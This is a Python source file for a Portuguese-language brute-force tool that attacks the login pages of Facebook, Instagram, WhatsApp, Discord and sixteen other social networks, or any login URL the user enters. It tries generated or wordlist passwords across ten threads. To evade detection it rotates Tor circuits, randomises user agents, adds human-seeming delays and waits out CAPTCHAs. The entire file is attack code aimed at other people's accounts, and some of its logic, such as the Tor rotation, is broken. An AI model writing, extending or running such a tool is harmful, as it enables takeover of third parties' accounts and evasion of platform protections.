import requests
import random
import time
import socket
import socks
from itertools import product
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn
from rich.table import Table
from rich.theme import Theme
from rich.text import Text
from rich import box
from fake_useragent import UserAgent
import warnings
import json
from pathlib import Path


warnings.filterwarnings("ignore")
VERSION = "2.0"
CONFIG_FILE = "brute_config.json"


custom_theme = Theme({
    "success": "bold green",
    "error": "bold red",
    "warning": "bold yellow",
    "info": "bold blue",
    "header": "bold cyan",
    "prompt": "bold magenta"
})
console = Console(theme=custom_theme)

class AttackState:
    def __init__(self):
        self.found = False
        self.password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.last_proxy_rotation = 0

state = AttackState()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def skull_art():
    console.print(Panel.fit("""
          ______
        .-"      "-.
       /            \\
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
         `--------`
    """, style="bold red"))

def show_banner():
    clear_screen()
    skull_art()
    console.print(Panel.fit(f"[header]HACKER TOOL v{VERSION} - FORÇA BRUTA AVANÇADA[/]", 
                          subtitle="by Security Researcher", box=box.DOUBLE))

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        console.print(f"[error]Erro ao salvar configuração: {str(e)}[/]")

def load_config():
    try:
        if Path(CONFIG_FILE).exists():
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        console.print(f"[warning]Erro ao carregar configuração: {str(e)}[/]")
    return {}

def menu():
    show_banner()
    table = Table(show_header=False, box=None)
    table.add_column(style="bold cyan", width=30)
    table.add_row("1. Ataque a Redes Sociais")
    table.add_row("2. Ataque a URL Customizada")
    table.add_row("3. Configurar Proxy/Tor")
    table.add_row("4. Configurações Avançadas")
    table.add_row("5. Sair")
    console.print(table)
    
    while True:
        try:
            choice = int(console.input("[prompt]>> [/]"))
            if 1 <= choice <= 5:
                return choice
            console.print("[error]Opção inválida! Escolha entre 1-5[/]")
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")

def social_media_menu():
    show_banner()
    console.print(Panel.fit("[header]REDES SOCIAIS DISPONÍVEIS[/]", box=box.ROUNDED))
    
    options = [
        "Facebook", "Instagram", "Twitter", "LinkedIn", "WhatsApp",
        "Telegram", "Snapchat", "Pinterest", "Reddit", "TikTok",
        "YouTube", "Twitch", "Tumblr", "Flickr", "VK",
        "Weibo", "QQ", "Douyin", "Line", "Discord",
        "Voltar"
    ]
    
    for i, option in enumerate(options, 1):
        console.print(f"[cyan]{i:>2}.[/] {option}")
    
    while True:
        try:
            choice = int(console.input("\n[prompt]Selecione a rede social: [/]"))
            if 1 <= choice <= 21:
                return choice
            console.print("[error]Opção inválida! Escolha entre 1-21[/]")
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")

def get_target_info():
    username = console.input("[prompt]Digite o nome de usuário/alvo: [/]")
    
    while True:
        try:
            min_length = int(console.input("[prompt]Comprimento mínimo da senha: [/]"))
            max_length = int(console.input("[prompt]Comprimento máximo da senha: [/]"))
            if min_length > max_length:
                console.print("[error]O comprimento mínimo não pode ser maior que o máximo![/]")
                continue
            break
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")
    
    chars = console.input("[prompt]Caracteres para testar (deixe em branco para todos os imprimíveis): [/]")
    
    if not chars:
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
    
    use_wordlist = console.input("[prompt]Deseja usar uma wordlist? (s/n): [/]").lower() == 's'
    wordlist_path = None
    
    if use_wordlist:
        wordlist_path = console.input("[prompt]Caminho para o arquivo de wordlist: [/]")
        if not Path(wordlist_path).exists():
            console.print("[error]Arquivo não encontrado![/]")
            wordlist_path = None
    
    return username, min_length, max_length, chars, wordlist_path

def configure_proxy():
    show_banner()
    console.print(Panel.fit("[header]CONFIGURAÇÃO DE PROXY[/]", box=box.ROUNDED))
    console.print("1. Usar Tor (padrão: 127.0.0.1:9050)")
    console.print("2. Configurar proxy manualmente")
    console.print("3. Não usar proxy")
    console.print("4. Rotação automática de proxies (Tor)")
    
    choice = int(console.input("[prompt]Escolha: [/]"))
    
    config = load_config()
    proxy_config = config.get("proxy", {})
    
    if choice == 1:
        proxy_config.update({
            "type": "tor",
            "host": "127.0.0.1",
            "port": 9050,
            "auto_rotate": False
        })
        set_proxy("127.0.0.1", 9050, "SOCKS5")
        console.print("[success]Proxy Tor configurado![/]")
    elif choice == 2:
        proxy_type = console.input("[prompt]Tipo de proxy (SOCKS5/HTTP): [/]").upper()
        host = console.input("[prompt]Host: [/]")
        port = int(console.input("[prompt]Porta: [/]"))
        
        proxy_config.update({
            "type": proxy_type.lower(),
            "host": host,
            "port": port,
            "auto_rotate": False
        })
        
        set_proxy(host, port, proxy_type)
        console.print(f"[success]Proxy {proxy_type} configurado![/]")
    elif choice == 3:
        proxy_config.update({"type": "none"})
        socks.set_default_proxy()
        console.print("[success]Proxy desativado![/]")
    elif choice == 4:
        proxy_config.update({
            "type": "tor",
            "host": "127.0.0.1",
            "port": 9050,
            "auto_rotate": True
        })
        set_proxy("127.0.0.1", 9050, "SOCKS5")
        console.print("[success]Proxy Tor com rotação automática configurado![/]")
    
    config["proxy"] = proxy_config
    save_config(config)
    time.sleep(2)

def set_proxy(host, port, proxy_type):
    if proxy_type == "SOCKS5":
        socks.set_default_proxy(socks.SOCKS5, host, port)
    else:
        socks.set_default_proxy(socks.HTTP, host, port)
    socket.socket = socks.socksocket

def rotate_tor_proxy():
    config = load_config()
    proxy_config = config.get("proxy", {})
    
    if proxy_config.get("auto_rotate", False):
        try:
            with requests.Session() as s:
                s.proxies = {
                    'http': 'socks5h://127.0.0.1:9050',
                    'https': 'socks5h://127.0.0.1:9050'
                }
                s.get("http://httpbin.org/ip")
                s.post("http://127.0.0.1:9051/control/newnym")
                time.sleep(5)  # Esperar o circuito ser renovado
        except Exception as e:
            console.print(f"[warning]Erro ao rotacionar circuito Tor: {str(e)}[/]")

def get_social_media_url(choice):
    urls = {
        1: "https://www.facebook.com/login.php",
        2: "https://www.instagram.com/accounts/login/",
        3: "https://twitter.com/login",
        4: "https://www.linkedin.com/login",
        5: "https://web.whatsapp.com",
        6: "https://web.telegram.org",
        7: "https://accounts.snapchat.com",
        8: "https://www.pinterest.com/login/",
        9: "https://www.reddit.com/login",
        10: "https://www.tiktok.com/login",
        11: "https://accounts.google.com/ServiceLogin?service=youtube",
        12: "https://www.twitch.tv/login",
        13: "https://www.tumblr.com/login",
        14: "https://www.flickr.com/signin",
        15: "https://vk.com/login",
        16: "https://weibo.com/login.php",
        17: "https://im.qq.com/login",
        18: "https://www.douyin.com/login",
        19: "https://line.me",
        20: "https://discord.com/login"
    }
    return urls.get(choice)

def get_headers():
    ua = UserAgent()
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

def check_captcha(response):
    captcha_indicators = ["captcha", "recaptcha", "hcaptcha", "verification", "human verification"]
    if any(indicator in response.text.lower() for indicator in captcha_indicators):
        return True
    return False

def brute_force_worker(url, username, password, timeout=10):
    if state.found:
        return False
    
    try:
        session = requests.Session()
        headers = get_headers()
        
        if time.time() - state.last_proxy_rotation > 300:  # 5 minutos
            rotate_tor_proxy()
            state.last_proxy_rotation = time.time()
        
        response = session.post(url, data={
            'username': username,
            'password': password
        }, headers=headers, timeout=timeout, allow_redirects=True)
        
        if check_captcha(response):
            console.print("[warning]CAPTCHA detectado! Pausando por 60 segundos...[/]")
            time.sleep(60)
            return False
        
    
        login_success = (
            "login error" not in response.text.lower() and 
            "invalid" not in response.text.lower() and
            "incorrect" not in response.text.lower() and
            response.url != url  # Redirecionamento após login
        )
        
        with state.lock:
            state.attempts += 1
            
            if login_success and not state.found:
                state.found = True
                state.password = password
                return True
        
        # Delay aleatório para parecer humano
        time.sleep(random.uniform(0.1, 0.5))
        
        return False
    except Exception as e:
        with state.lock:
            state.attempts += 1
        return False

def generate_passwords(min_len, max_len, chars):
    for length in range(min_len, max_len + 1):
        for attempt in product(chars, repeat=length):
            yield ''.join(attempt)

def load_wordlist(path):
    try:
        with open(path, 'r', errors='ignore') as f:
            for line in f:
                yield line.strip()
    except Exception as e:
        console.print(f"[error]Erro ao ler wordlist: {str(e)}[/]")
        return []

def show_stats():
    attempts = state.attempts
    elapsed = time.time() - state.start_time
    speed = attempts / elapsed if elapsed > 0 else 0
    
    console.print(f"\n[info]Tentativas: {attempts}[/]")
    console.print(f"[info]Velocidade: {speed:.2f} senhas/segundo[/]")
    console.print(f"[info]Tempo decorrido: {elapsed:.2f} segundos[/]")
    
    if state.found:
        console.print(f"[success]SENHA ENCONTRADA: {state.password}[/]")
        return True
    return False

def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None):
    state.__init__()  # Resetar estado
    
    console.print(f"\n[header]Iniciando ataque de força bruta em {url}[/]")
    console.print(f"[info]Alvo: {username}[/]")
    console.print(f"[info]Intervalo de senhas: {min_len}-{max_len} caracteres[/]")
    
    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars)
    
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Testando senhas...", total=None)
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for password in password_generator:
                if state.found:
                    break
                
                futures.append(executor.submit(brute_force_worker, url, username, password))
          
                if len(futures) % 100 == 0:
                    progress.update(task, description=f"[cyan]Testando senhas... {state.attempts} tentativas")
                    
                    # Mostrar estatísticas
                    if show_stats():
                        break
            
            # Esperar todas as threads completarem
            for future in futures:
                future.result()
    
    show_stats()

def advanced_settings():
    show_banner()
    console.print(Panel.fit("[header]CONFIGURAÇÕES AVANÇADAS[/]", box=box.ROUNDED))
    
    config = load_config()
    
    console.print("1. Configurar tempo máximo de tentativa")
    console.print("2. Configurar delay entre tentativas")
    console.print("3. Configurar número de threads")
    console.print("4. Limpar configurações salvas")
    console.print("5. Voltar")
    
    choice = int(console.input("[prompt]Escolha: [/]"))
    
    if choice == 1:
        timeout = int(console.input("[prompt]Tempo máximo por tentativa (segundos): [/]"))
        config["timeout"] = timeout
        console.print(f"[success]Timeout configurado para {timeout} segundos[/]")
    elif choice == 2:
        min_delay = float(console.input("[prompt]Delay mínimo entre tentativas (segundos): [/]"))
        max_delay = float(console.input("[prompt]Delay máximo entre tentativas (segundos): [/]"))
        config["delays"] = {"min": min_delay, "max": max_delay}
        console.print(f"[success]Delay configurado entre {min_delay}-{max_delay} segundos[/]")
    elif choice == 3:
        threads = int(console.input("[prompt]Número máximo de threads: [/]"))
        config["threads"] = threads
        console.print(f"[success]Número de threads configurado para {threads}[/]")
    elif choice == 4:
        try:
            os.remove(CONFIG_FILE)
            console.print("[success]Configurações removidas![/]")
        except Exception as e:
            console.print(f"[error]Erro ao remover configurações: {str(e)}[/]")
    
    save_config(config)
    time.sleep(2)

def main():
    try:
        while True:
            choice = menu()
            
            if choice == 1:
                sm_choice = social_media_menu()
                if sm_choice == 21:
                    continue
                
                url = get_social_media_url(sm_choice)
                username, min_len, max_len, chars, wordlist_path = get_target_info()
                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                
                if not state.found:
                    console.print("[error]Ataque concluído - senha não encontrada[/]")
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 2:
                url = console.input("[prompt]Digite a URL de login: [/]")
                username, min_len, max_len, chars, wordlist_path = get_target_info()
                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                
                if not state.found:
                    console.print("[error]Ataque concluído - senha não encontrada[/]")
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 3:
                configure_proxy()
            
            elif choice == 4:
                advanced_settings()
            
            elif choice == 5:
                console.print("[header]Saindo... Até a próxima![/]")
                time.sleep(2)
                break
    
    except KeyboardInterrupt:
        console.print("\n[error]Operação cancelada pelo usuário.[/]")
    except Exception as e:
        console.print(f"[error]Erro fatal: {str(e)}[/]")
    finally:
        socks.set_default_proxy()  # Limpar configurações de proxy

if __name__ == "__main__":
    main()
